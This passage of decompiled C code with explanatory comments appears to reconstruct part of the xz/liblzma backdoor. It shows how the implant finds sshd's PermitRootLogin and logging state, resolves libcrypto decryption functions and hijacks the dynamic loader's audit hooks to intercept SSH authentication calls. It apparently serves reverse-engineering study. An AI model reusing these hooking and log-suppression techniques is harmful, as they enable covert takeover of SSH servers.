                                          (search_image,string_cursor,(u8 *)0x0,(u8 *)0x0,(ulong *)&probe_dasm_ctx);
                  scratch_reg_index = TRUE;
                }
                string_cursor = string_cursor + 8;
              }
            }
          }
          goto LAB_001065af;
        }
        goto LAB_00105a60;
      }
    }
  }
LAB_00105a59:
  hooks_data = (backdoor_hooks_data_t *)0x0;
  goto LAB_00105a60;
code_r0x00105962:
  string_begin = string_begin + -0x40;
  if (string_begin == symbol_module_ehdr) goto LAB_00105a59;
  goto LAB_00105951;
LAB_00106471:
  do {
    string_cursor = elf_find_encoded_string_in_rodata(search_image,(EncodedStringId *)decode_ctx_cursor,(void *)0x0);
    if (string_cursor != (char *)0x0) {
      if (scratch_reg_index) {
        // AutoDoc: A second hit on the auth-root literal means PermitRootLogin defaults to yes, so stash that state before publishing the pointer.
        ((hooks_data->global_ctx).sshd_ctx)->auth_root_allowed_flag = 1;
        goto LAB_001064b8;
      }
      scratch_reg_index = TRUE;
    }
    decode_ctx_cursor = (dasm_ctx_t *)((long)&decode_ctx_cursor->instruction + 4);
  } while (decode_ctx_cursor != (dasm_ctx_t *)((long)&probe_dasm_ctx.instruction_size + 4));
  ((hooks_data->global_ctx).sshd_ctx)->auth_root_allowed_flag = 0;
LAB_001064b8:
  auth_log_reloc = (int *)find_riprel_mov_load_target_in_range
                             (XREF_auth_root_allowed,&loader_data.sshd_string_refs,text_segment,
                              scan_cursor + (long)text_segment);
  if (auth_log_reloc != (int *)0x0) {
    if ((((hooks_data->global_ctx).sshd_ctx)->auth_root_allowed_flag != 0) &&
       ((hooks_data->global_ctx).uses_endbr64 != FALSE)) {
      auth_root_vote_count = 0;
      loop_idx = 0;
      *(uint *)&probe_dasm_ctx.instruction_size = 0x10;
      probe_dasm_ctx.instruction = (u8 *)0xf0000000e;
      hooks = (backdoor_hooks_data_t *)0x0;
      do {
        scan_cursor = (u8 *)(&loader_data.sshd_string_refs.xcalloc_zero_size)
                        [*(uint *)(probe_dasm_ctx.opcode_window_prefix + loop_idx * 4 + -0x25)].func_start;
        if (scan_cursor != (u8 *)0x0) {
          authprobe_func_end = (u8 *)(&loader_data.sshd_string_refs.xcalloc_zero_size)
                          [*(uint *)(probe_dasm_ctx.opcode_window_prefix + loop_idx * 4 + -0x25)].func_end;
          auth_root_vote_count = auth_root_vote_count + 1;
          probe_success = find_riprel_ptr_lea_or_mov_load(scan_cursor,authprobe_func_end,(dasm_ctx_t *)0x0,auth_log_reloc);
          if ((probe_success != FALSE) ||
             (probe_success = find_riprel_grp1_imm8_memref(scan_cursor,authprobe_func_end,(dasm_ctx_t *)0x0,auth_log_reloc),
             probe_success != FALSE)) {
            hooks = (backdoor_hooks_data_t *)(ulong)((int)hooks + 1);
          }
        }
        loop_idx = loop_idx + 1;
      } while (loop_idx != 3);
      // AutoDoc: Abort if every probe spots the auth_root literal but no MOV/ADD ever reaches it, which signals an sshd build we don't know how to patch safely.
      if ((auth_root_vote_count != 0) && ((int)hooks == 0)) goto LAB_001065af;
    }
    // AutoDoc: Publish the `PermitRootLogin` boolean only after the literal and pointer line up so later hooks can flip it without bricking sshd.
    ((hooks_data->global_ctx).sshd_ctx)->permit_root_login_ptr = auth_log_reloc;
  }
LAB_001065af:
  libcrypto_symbol = elf_gnu_hash_lookup_symbol(loader_data.elf_handles.libcrypto,STR_EVP_DecryptFinal_ex,0);
  // AutoDoc: Locate the global monitor struct so the mm hook wrappers can patch sockets, flags, and auth state safely.
  probe_success = sshd_find_monitor_ptr_slot(loader_data.elf_handles.sshd,&loader_data.sshd_string_refs,ctx);
  if (probe_success == FALSE) {
    (hooks_data->sshd_ctx).have_mm_answer_keyallowed = FALSE;
    (hooks_data->sshd_ctx).have_mm_answer_keyverify = FALSE;
  }
  sshd_log_ctx_ptr = (hooks_data->global_ctx).sshd_log_ctx;
  libc_allocator->opaque = loader_data.elf_handles.libc;
  literal_probe_slot = 0;
  sshd_log_ctx_ptr->log_squelched = FALSE;
  sshd_log_ctx_ptr->handler_slots_valid = FALSE;
  text_segment = elf_get_text_segment(&loader_data.main_info,&literal_probe_slot);
  signed_payload_size = literal_probe_slot;
  if ((((text_segment != (void *)0x0) && (0x10 < literal_probe_slot)) &&
      ((u8 *)loader_data.sshd_string_refs.sshlogv_format.func_start != (u8 *)0x0)) &&
     (((hooks_data->global_ctx).uses_endbr64 == FALSE ||
      (probe_success = is_endbr32_or_64((u8 *)loader_data.sshd_string_refs.sshlogv_format.func_start,
                                 (u8 *)((long)loader_data.sshd_string_refs.sshlogv_format.func_start +
                                       4),0xe230), probe_success != FALSE)))) {
    // AutoDoc: Carry the `sshlogv` implementation pointer over from the earlier string-ref pass so the log hook never has to rediscover it.
    sshd_log_ctx_ptr->sshlogv_impl = loader_data.sshd_string_refs.sshlogv_format.func_start;
    decode_ctx_cursor = &syslog_dasm_ctx;
    for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
      *(u32 *)&decode_ctx_cursor->instruction = 0;
      decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + 4);
    }
    if ((u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_start != (u8 *)0x0) {
      syslog_bad_level_cursor = (u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_start;
      validated_log_handler = (log_handler_fn *)0x0;
      log_handler_ctx_candidate = (log_handler_fn *)0x0;
      do {
        while( TRUE ) {
          if ((loader_data.sshd_string_refs.syslog_bad_level.func_end <= syslog_bad_level_cursor) ||
             ((validated_log_handler != (log_handler_fn *)0x0 && (log_handler_ctx_candidate != (log_handler_fn *)0x0))))
          goto LAB_00106bf0;
          probe_success = x86_decode_instruction
                             (&syslog_dasm_ctx,syslog_bad_level_cursor,
                              (u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_end);
          if (probe_success != FALSE) break;
          syslog_bad_level_cursor = syslog_bad_level_cursor + 1;
        }
        if ((syslog_dasm_ctx.opcode_window.opcode_window_dword & X86_OPCODE_MASK_IGNORE_DIR) == X86_OPCODE_1B_XOR_RM_R) {
          if (syslog_dasm_ctx.prefix.modrm_bytes.modrm_mod != '\x03') goto LAB_00106735;
          if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_MODRM_IMM64_MASK) == 0) {
            if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_MODRM) != 0) {
              relr_retry_flag = 0;
LAB_001067cf:
              mov_dst_reg = syslog_dasm_ctx.prefix.modrm_bytes.modrm_rm;
              if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_REX) != 0) {
                mov_dst_reg = syslog_dasm_ctx.prefix.modrm_bytes.modrm_rm |
                         ((syslog_dasm_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
              }
              goto LAB_001067ed;
            }
            mov_dst_reg = 0;
          }
          else {
            if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_MODRM) != 0) {
              relr_retry_flag = syslog_dasm_ctx.prefix.modrm_bytes.modrm_reg;
              if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_REX) != 0) {
                relr_retry_flag = relr_retry_flag | ((syslog_dasm_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1);
              }
              goto LAB_001067cf;
            }
            mov_dst_reg = syslog_dasm_ctx.prefix.decoded.flags2 & DF2_IMM64;
            if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_IMM64) == 0) goto LAB_001067fb;
            relr_retry_flag = syslog_dasm_ctx.mov_imm_reg_index;
            if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_REX) != 0) {
              relr_retry_flag = syslog_dasm_ctx.mov_imm_reg_index |
                       ((syslog_dasm_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3);
            }
            mov_dst_reg = 0;
LAB_001067ed:
            if (relr_retry_flag != mov_dst_reg) goto LAB_00106735;
          }
LAB_001067fb:
          mov_src_reg = 0;
          log_literal_slot = 0;
          log_handler_ctx_candidate = (log_handler_fn *)0x0;
          decode_ctx_cursor = &probe_dasm_ctx;
          for (loop_idx = 0x16; loop_idx != 0; loop_idx = loop_idx + -1) {
            *(u32 *)&decode_ctx_cursor->instruction = 0;
            decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + 4);
          }
          log_handler_slot_candidate = (log_handler_fn *)0x0;
          scan_cursor = syslog_bad_level_cursor;
          for (; (scan_cursor < loader_data.sshd_string_refs.syslog_bad_level.func_end && (log_literal_slot < 5));
              log_literal_slot = log_literal_slot + 1) {
            if ((log_handler_slot_candidate != (log_handler_fn *)0x0) && (log_handler_ctx_candidate != (log_handler_fn *)0x0))
            goto LAB_00106b3c;
            probe_success = find_riprel_mov(scan_cursor,(u8 *)loader_data.sshd_string_refs.syslog_bad_level.
                                                   func_end,TRUE,FALSE,&probe_dasm_ctx);
            if (probe_success == FALSE) break;
            if ((probe_dasm_ctx.prefix.flags_u16 & DF16_MODRM_IMM64_MASK) != 0) {
              if ((probe_dasm_ctx.prefix.flags_u16 & DF16_MODRM) == 0) {
                mov_src_reg = probe_dasm_ctx.prefix.decoded.flags2 & DF2_IMM64;
                if (((probe_dasm_ctx.prefix.flags_u16 & DF16_IMM64) != 0) &&
                   (mov_src_reg = probe_dasm_ctx.mov_imm_reg_index, (probe_dasm_ctx.prefix.flags_u16 & DF16_REX) != 0))
                {
                  relr_retry_flag = (probe_dasm_ctx.prefix.modrm_bytes.rex_byte & REX_B) << 3;
                  goto LAB_001068e4;
                }
              }
              else {
                mov_src_reg = probe_dasm_ctx.prefix.modrm_bytes.modrm_reg;
                if ((probe_dasm_ctx.prefix.flags_u16 & DF16_REX) != 0) {
                  relr_retry_flag = (probe_dasm_ctx.prefix.modrm_bytes.rex_byte & REX_R) << 1;
LAB_001068e4:
                  mov_src_reg = mov_src_reg | relr_retry_flag & 8;
                }
              }
            }
            main_data_base = log_handler_ctx_candidate;
            if ((mov_dst_reg == mov_src_reg) && ((probe_dasm_ctx.prefix.flags_u16 & DF16_MEM_DISP) != 0)) {
              log_handler_slot_tmp = (log_handler_fn *)probe_dasm_ctx.mem_disp;
              if (((uint)probe_dasm_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32) {
                log_handler_slot_tmp = (log_handler_fn *)
                           ((u8 *)(probe_dasm_ctx.mem_disp + (long)probe_dasm_ctx.instruction) +
                           CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
                                    (u32)probe_dasm_ctx.instruction_size));
              }
              literal_scan_slot = 0;
              log_handler_tmp_ptr = (log_handler_fn *)
                         elf_get_writable_tail_span(&loader_data.main_info,&literal_scan_slot,FALSE);
              if ((((log_handler_tmp_ptr == (log_handler_fn *)0x0) ||
                   ((log_handler_fn *)(literal_scan_slot + (long)log_handler_tmp_ptr) <= log_handler_slot_tmp)) ||
                  (log_handler_slot_tmp < log_handler_tmp_ptr)) ||
                 (((log_handler_slot_tmp == log_handler_ctx_candidate && (log_handler_slot_tmp == log_handler_slot_candidate)) ||
                  (main_data_base = log_handler_slot_tmp, log_handler_slot_candidate != (log_handler_fn *)0x0)))) goto LAB_00106997;
            }
            else {
LAB_00106997:
              log_handler_slot_tmp = log_handler_slot_candidate;
              log_handler_ctx_candidate = main_data_base;
            }
            scan_cursor = probe_dasm_ctx.instruction +
                      CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
                               (u32)probe_dasm_ctx.instruction_size);
            log_handler_slot_candidate = log_handler_slot_tmp;
          }
          if ((log_handler_slot_candidate == (log_handler_fn *)0x0) || (log_handler_ctx_candidate == (log_handler_fn *)0x0)) {
LAB_00106ab1:
            log_handler_ctx_candidate = (log_handler_fn *)0x0;
            validated_log_handler = (log_handler_fn *)0x0;
          }
          else {
LAB_00106b3c:
            // AutoDoc: Reject sshlogv handlers that fall outside `.data`; the log hook only executes if both pointers survive this validation.
            probe_success = sshd_validate_log_handler_slots
                               (log_handler_slot_candidate,log_handler_ctx_candidate,text_segment,(u8 *)((long)text_segment + signed_payload_size),
                                &loader_data.sshd_string_refs,ctx);
            validated_log_handler = log_handler_slot_candidate;
            if (probe_success != FALSE) {
              // AutoDoc: Record the sshlogv handler/context recovered from `syslog_bad_level` so the log shim can squelch or rewrite messages without disassembling again.
              sshd_log_ctx_ptr->log_handler_slot = log_handler_slot_candidate;
              search_image = &loader_data.main_info;
              sshd_log_ctx_ptr->log_handler_ctx_slot = log_handler_ctx_candidate;
              sshd_log_ctx_ptr->handler_slots_valid = TRUE;
              probe_dasm_ctx.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction + 4),0x708);
              string_cursor = elf_find_encoded_string_in_rodata
                                  (search_image,(EncodedStringId *)&probe_dasm_ctx,(void *)0x0);
              sshd_log_ctx_ptr->fmt_percent_s = string_cursor;
              if (string_cursor != (char *)0x0) {
                probe_dasm_ctx.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction + 4),0x790);
                string_cursor = elf_find_encoded_string_in_rodata
                                    (search_image,(EncodedStringId *)&probe_dasm_ctx,(void *)0x0);
                sshd_log_ctx_ptr->str_connection_closed_by = string_cursor;
                if (string_cursor != (char *)0x0) {
                  probe_dasm_ctx.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction + 4),0x4f0);
                  string_cursor = elf_find_encoded_string_in_rodata
                                      (search_image,(EncodedStringId *)&probe_dasm_ctx,(void *)0x0);
                  sshd_log_ctx_ptr->str_preauth = string_cursor;
                  if (string_cursor != (char *)0x0) {
                    probe_dasm_ctx.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction + 4),0x1d8);
                    string_cursor = elf_find_encoded_string_in_rodata
                                        (search_image,(EncodedStringId *)&probe_dasm_ctx,(void *)0x0);
                    sshd_log_ctx_ptr->str_authenticating = string_cursor;
                    if (string_cursor != (char *)0x0) {
                      probe_dasm_ctx.instruction = (u8 *)CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction + 4),0xb10);
                      string_cursor = elf_find_encoded_string_in_rodata
                                          (search_image,(EncodedStringId *)&probe_dasm_ctx,(void *)0x0);
                      sshd_log_ctx_ptr->str_user = string_cursor;
                      if (string_cursor != (char *)0x0) break;
                    }
                  }
                }
              }
              sshd_log_ctx_ptr->log_squelched = TRUE;
              break;
            }
          }
        }
        else if ((((syslog_dasm_ctx.opcode_window.opcode_window_dword == X86_OPCODE_1B_MOV_RM_IMM32) &&
                  ((uint)syslog_dasm_ctx.prefix.decoded.modrm >> 8 == 0x50000)) &&
                 ((syslog_dasm_ctx.prefix.flags_u16 & DF16_IMM) != 0)) && (syslog_dasm_ctx.imm_zeroextended == 0))
        {
          log_handler_slot_candidate = (log_handler_fn *)0x0;
          if ((syslog_dasm_ctx.prefix.flags_u16 & DF16_MEM_DISP) != 0) {
            log_handler_slot_candidate = (log_handler_fn *)
                    (syslog_dasm_ctx.instruction + syslog_dasm_ctx.instruction_size + syslog_dasm_ctx.mem_disp);
          }
          probe_dasm_ctx.instruction = (u8 *)0x0;
          main_data_base = (log_handler_fn *)
                     elf_get_writable_tail_span(&loader_data.main_info,(u64 *)&probe_dasm_ctx,FALSE);
          if (((main_data_base != (log_handler_fn *)0x0) &&
              (log_handler_slot_candidate < probe_dasm_ctx.instruction + (long)main_data_base)) && (main_data_base <= log_handler_slot_candidate)) {
            decode_ctx_cursor = &probe_dasm_ctx;
            for (loop_idx = 0x16; scan_cursor = syslog_bad_level_cursor, loop_idx != 0; loop_idx = loop_idx + -1) {
              *(u32 *)&decode_ctx_cursor->instruction = 0;
              decode_ctx_cursor = (dasm_ctx_t *)((long)decode_ctx_cursor + 4);
            }
            do {
              probe_success = find_riprel_opcode_memref_ex
                                 (scan_cursor,(u8 *)loader_data.sshd_string_refs.syslog_bad_level.func_end
                                  ,&probe_dasm_ctx,X86_OPCODE_1B_MOV_RM_IMM32,(void *)0x0);
              if (probe_success == FALSE) break;
              if ((probe_dasm_ctx.imm_zeroextended == 0) && ((probe_dasm_ctx.prefix.flags_u16 & DF16_MEM_DISP) != 0))
              {
                log_handler_ctx_candidate = (log_handler_fn *)probe_dasm_ctx.mem_disp;
                if (((uint)probe_dasm_ctx.prefix.decoded.modrm & XZ_MODRM_RIPREL_DISP32_MASK) == XZ_MODRM_RIPREL_DISP32) {
                  log_handler_ctx_candidate = (log_handler_fn *)
                          ((u8 *)(probe_dasm_ctx.mem_disp + (long)probe_dasm_ctx.instruction) +
                          CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
                                   (u32)probe_dasm_ctx.instruction_size));
                }
                literal_scan_slot = 0;
                main_data_base = (log_handler_fn *)
                           elf_get_writable_tail_span(&loader_data.main_info,&literal_scan_slot,FALSE);
                if ((((main_data_base != (log_handler_fn *)0x0) &&
                     (log_handler_ctx_candidate < (log_handler_fn *)(literal_scan_slot + (long)main_data_base))) &&
                    (main_data_base <= log_handler_ctx_candidate)) && (log_handler_slot_candidate != log_handler_ctx_candidate)) goto LAB_00106b3c;
              }
              scan_cursor = probe_dasm_ctx.instruction +
                        CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
                                 (u32)probe_dasm_ctx.instruction_size);
            } while (probe_dasm_ctx.instruction +
                     CONCAT44(*(uint *)((u8 *)&probe_dasm_ctx.instruction_size + 4),
                              (u32)probe_dasm_ctx.instruction_size) <
                     loader_data.sshd_string_refs.syslog_bad_level.func_end);
            goto LAB_00106ab1;
          }
        }
LAB_00106735:
        syslog_bad_level_cursor = syslog_bad_level_cursor + syslog_dasm_ctx.instruction_size;
      } while( TRUE );
    }
  }
LAB_00106bf0:
  libcrypto_allocator->opaque = loader_data.elf_handles.libcrypto;
  if (bn_bin2bn_symbol != (Elf64_Sym *)0x0) {
    symbol_rva = bn_bin2bn_symbol->st_value;
    symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
    resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
    *resolved_count_ptr = *resolved_count_ptr + 1;
    (hooks_data->imported_funcs).EVP_DecryptUpdate =
         (pfn_EVP_DecryptUpdate_t)(symbol_module_ehdr->e_ident + symbol_rva);
  }
  if (libcrypto_symbol != (Elf64_Sym *)0x0) {
    symbol_rva = libcrypto_symbol->st_value;
    symbol_module_ehdr = (loader_data.elf_handles.libcrypto)->elfbase;
    resolved_count_ptr = &(hooks_data->imported_funcs).resolved_imports_count;
    *resolved_count_ptr = *resolved_count_ptr + 1;
    (hooks_data->imported_funcs).EVP_DecryptFinal_ex =
         (pfn_EVP_DecryptFinal_ex_t)(symbol_module_ehdr->e_ident + symbol_rva);
  }
  probe_success = libcrypto_imports_ready_or_install_bootstrap(imported_funcs);
  if (((((((probe_success != FALSE) &&
          (lzma_free((hooks_data->imported_funcs).EVP_MD_CTX_new,libcrypto_allocator),
          (hooks_data->libc_imports).resolved_imports_count == 0xc)) &&
         // AutoDoc: Stream every resolved hook/trampoline pointer into `secret_data` so telemetry and the command channel can attest to the install.
         (probe_success = secret_data_append_bits_from_addr_or_ret
                             ((void *)0x1,(secret_data_shift_cursor_t)0x145,0x78,0x18),
         probe_success != FALSE)) &&
        ((probe_success = secret_data_append_bits_from_addr_or_ret
                             (params->hook_ctx->symbind64_trampoline,
                              (secret_data_shift_cursor_t)0x12a,4,0x12), probe_success != FALSE &&
         (probe_success = secret_data_append_item_if_enabled
                             ((secret_data_shift_cursor_t)0x12e,0x13,4,0x20,
                              (u8 *)params->hook_ctx->rsa_public_decrypt_entry), probe_success != FALSE))))
       && (probe_success = secret_data_append_bits_from_addr_or_ret
                              (params->shared_globals->evp_set1_rsa_hook_entry,
                               (secret_data_shift_cursor_t)0x132,6,0x14), probe_success != FALSE)) &&
      ((probe_success = secret_data_append_item_if_enabled
                           ((secret_data_shift_cursor_t)0x138,0x15,2,0x10,
                            (u8 *)params->hook_ctx->rsa_get0_key_entry), probe_success != FALSE &&
       (probe_success = secret_data_append_item_if_enabled
                           ((secret_data_shift_cursor_t)0xee,0x10,0x26,0x20,
                            (u8 *)params->hook_ctx->mm_answer_keyallowed_entry), probe_success != FALSE))))
     && ((probe_success = secret_data_append_item_if_enabled
                             ((secret_data_shift_cursor_t)0x140,0x17,5,0x20,
                              (u8 *)params->hook_ctx->mm_answer_keyverify_entry), probe_success != FALSE &&
         (((probe_success = secret_data_append_item_if_enabled
                               ((secret_data_shift_cursor_t)0x13a,0x16,6,0x20,
                                (u8 *)params->shared_globals->authpassword_hook_entry),
           probe_success != FALSE &&
           (probe_success = secret_data_append_item_if_enabled
                               ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
                                (u8 *)elf_functions_table->elf_info_parse), probe_success != FALSE)) &&
          // AutoDoc: Refuse to touch `_dl_audit` until telemetry shows all 0x1c8 hook/trampoline bits recorded in `secret_data`.
          ((hooks_data->global_ctx).secret_bits_filled == 0x1c8)))))) {
    *(hooks_data->ldso_ctx).libcrypto_l_name = (char *)hooks_data;
    resolved_count_ptr = (u32 *)((long)&(loader_data.sshd_link_map)->l_name + link_map_delta);
    auditstate_snapshot = *resolved_count_ptr;
    (hooks_data->ldso_ctx).sshd_auditstate_bindflags_ptr = resolved_count_ptr;
    (hooks_data->ldso_ctx).sshd_auditstate_bindflags_old_value = auditstate_snapshot;
    *resolved_count_ptr = 2;
    // AutoDoc: Flip sshd’s `l_audit_any_plt` bit so `_dl_audit_symbind_alt` starts calling our symbind trampoline for every sshd→libcrypto PLT.
    audit_slot_byte = (byte *)(hooks_data->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
    *audit_slot_byte = *audit_slot_byte | (hooks_data->ldso_ctx).link_map_l_audit_any_plt_bitmask;
    resolved_count_ptr = (u32 *)((long)&(loader_data.libcrypto_link_map)->l_name + link_map_delta);
    auditstate_snapshot = *resolved_count_ptr;
    (hooks_data->ldso_ctx).libcrypto_auditstate_bindflags_ptr = resolved_count_ptr;
    (hooks_data->ldso_ctx).libcrypto_auditstate_bindflags_old_value = auditstate_snapshot;
    audit_ifaces_slot_ptr = &(hooks_data->ldso_ctx).hooked_audit_ifaces;
    *resolved_count_ptr = 1;
    audit_ifaces_zero_cursor = audit_ifaces_slot_ptr;
    for (loop_idx = 0x1e; loop_idx != 0; loop_idx = loop_idx + -1) {
      *(u32 *)&audit_ifaces_zero_cursor->activity = 0;
      audit_ifaces_zero_cursor = (audit_ifaces *)((long)audit_ifaces_zero_cursor + 4);
    }
    (hooks_data->ldso_ctx).hooked_audit_ifaces.symbind =
         (audit_symbind_fn_t)params->hook_ctx->symbind64_trampoline;
    *(hooks_data->ldso_ctx)._dl_audit_ptr = audit_ifaces_slot_ptr;
    *(hooks_data->ldso_ctx)._dl_naudit_ptr = 1;
    loop_idx = 0;
    libc_allocator = loader_data.active_lzma_allocator;
    while (libc_allocator != (lzma_allocator *)0x0) {
      *(u8 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx) =
           *(u8 *)((long)&loader_data.saved_lzma_allocator.alloc + loop_idx);
      libc_allocator = (lzma_allocator *)(loop_idx + -0x17);
      loop_idx = loop_idx + 1;
    }
    goto LAB_00105a81;
  }
LAB_00105a60:
  libc_allocator = &loader_data.saved_lzma_allocator;
  restore_ldso_audit_state(&hooks_data->ldso_ctx);
  loop_idx = 0;
  libcrypto_allocator = loader_data.active_lzma_allocator;
  while (libcrypto_allocator != (lzma_allocator *)0x0) {
    *(u8 *)((long)&(loader_data.active_lzma_allocator)->alloc + loop_idx) =
         *(u8 *)((long)&libc_allocator->alloc + loop_idx);
    libcrypto_allocator = (lzma_allocator *)(loop_idx + -0x17);
    loop_idx = loop_idx + 1;
  }
LAB_00105a81:
  entry_ctx_ptr = params->entry_ctx;
  (entry_ctx_ptr->got_ctx).tls_got_entry = (void *)0x0;
  (entry_ctx_ptr->got_ctx).cpuid_got_slot = (void *)0x0;
  (entry_ctx_ptr->got_ctx).cpuid_slot_index = 0;
  (entry_ctx_ptr->got_ctx).got_base_offset = 0;
  // AutoDoc: Clear the cpuid GOT bookkeeping on exit so glibc repopulates the slot naturally the next time `_dl_runtime_resolve` runs.
  entry_ctx_ptr->cpuid_random_symbol_addr = (void *)0x1;
  auth_log_reloc = (int *)cpuid_basic_info(0);
  if (*auth_log_reloc != 0) {
    cpuid_leaf_ptr = (u32 *)cpuid_Version_info(1);
    cpuid_edx = cpuid_leaf_ptr[1];
    cpuid_ebx = cpuid_leaf_ptr[2];
    cpuid_ecx = cpuid_leaf_ptr[3];
    *(u32 *)&(entry_ctx_ptr->got_ctx).tls_got_entry = *cpuid_leaf_ptr;
    *(u32 *)&(entry_ctx_ptr->got_ctx).cpuid_got_slot = cpuid_edx;
    *(u32 *)&(entry_ctx_ptr->got_ctx).cpuid_slot_index = cpuid_ecx;
    *(u32 *)&(entry_ctx_ptr->got_ctx).got_base_offset = cpuid_ebx;
  }
  return FALSE;
}

